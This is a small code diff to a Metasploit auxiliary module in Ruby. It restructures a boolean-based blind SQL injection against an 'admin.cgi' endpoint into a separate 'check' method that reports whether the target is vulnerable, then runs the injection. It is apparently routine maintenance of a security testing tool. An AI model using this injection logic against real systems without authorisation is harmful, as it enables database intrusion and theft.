@@ -91,7 +91,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def run
+  def check
     @sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|
       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'admin.cgi'),
@@ -102,10 +102,17 @@ class MetasploitModule < Msf::Auxiliary
       !res.headers['Set-Cookie'] # no Set-Cookie header means the session cookie is valid
     end
     if @sqli.test_vulnerable
-      print_good 'Target seems vulnerable'
+      Exploit::CheckCode::Vulnerable
     else
-      fail_with 'Target does not seem to be vulnerable'
+      Exploit::CheckCode::Safe
     end
+  end
+
+  def run
+    unless check == Exploit::CheckCode::Vulnerable
+      fail_with(Failure::NotVulnerable, 'Target does not seem to be vulnerable')
+    end
+    print_good 'Target seems vulnerable'
     perform_sqli
   end
 end
